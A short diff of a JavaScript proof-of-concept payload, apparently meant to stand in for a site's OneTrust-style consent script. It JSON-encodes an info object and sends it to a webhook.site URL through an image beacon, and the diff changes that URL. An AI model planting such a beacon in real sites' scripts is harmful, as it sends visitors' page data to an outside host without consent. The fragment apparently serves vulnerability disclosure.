@@ -1,4 +1,4 @@
-// contents of OtAutoBlock.js or otSDKStub.js — same as payload.js
+// PoC payload — safe proof-of-execution
 (function(){
   try {
     const info = {
@@ -10,7 +10,7 @@
     };
 
     const q = encodeURIComponent(JSON.stringify(info));
-    const beaconUrl = 'https://webhook.site/7ba25211-0a1a-4e4f-a645-4f26b4ec6b71' + q;
+    const beaconUrl = 'https://webhook.site/7ba25211-0a1a-4e4f-a645-4f26b4ec6b71/collect?data=' + q;
 
     const img = new Image();
     img.src = beaconUrl;
